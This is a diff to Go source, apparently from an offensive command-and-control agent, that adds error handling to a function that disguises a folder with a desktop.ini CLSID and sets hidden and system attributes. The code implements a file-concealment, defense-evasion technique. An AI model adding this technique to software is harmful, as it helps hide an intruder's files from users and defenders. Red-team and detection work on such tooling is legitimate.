@@ -102,15 +102,27 @@ func masqueradeDesktopINI(folderPath, clsid string) structs.CommandResult {
 		return errorf("writing desktop.ini: %v", err)
 	}
 
+	var warnings []string
+
 	// Set desktop.ini as hidden+system
 	iniPtr, _ := syscall.UTF16PtrFromString(iniPath)
-	_ = syscall.SetFileAttributes(iniPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
+	if err := syscall.SetFileAttributes(iniPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM); err != nil {
+		warnings = append(warnings, fmt.Sprintf("failed to set desktop.ini hidden+system: %v", err))
+	}
 
 	// Set folder as system (required for desktop.ini to take effect)
 	folderPtr, _ := syscall.UTF16PtrFromString(folderPath)
-	folderAttrs, _ := syscall.GetFileAttributes(folderPtr)
-	_ = syscall.SetFileAttributes(folderPtr, folderAttrs|syscall.FILE_ATTRIBUTE_SYSTEM)
+	folderAttrs, err := syscall.GetFileAttributes(folderPtr)
+	if err != nil {
+		warnings = append(warnings, fmt.Sprintf("failed to read folder attributes: %v", err))
+	} else if err := syscall.SetFileAttributes(folderPtr, folderAttrs|syscall.FILE_ATTRIBUTE_SYSTEM); err != nil {
+		warnings = append(warnings, fmt.Sprintf("failed to set folder system attribute: %v", err))
+	}
 
-	return successf("[+] Desktop.ini disguise applied to: %s\n  CLSID: %s\n  desktop.ini: %s (hidden+system)",
+	result := fmt.Sprintf("[+] Desktop.ini disguise applied to: %s\n  CLSID: %s\n  desktop.ini: %s (hidden+system)",
 		folderPath, clsid, iniPath)
+	for _, w := range warnings {
+		result += fmt.Sprintf("\n[!] Warning: %s", w)
+	}
+	return successResult(result)
 }
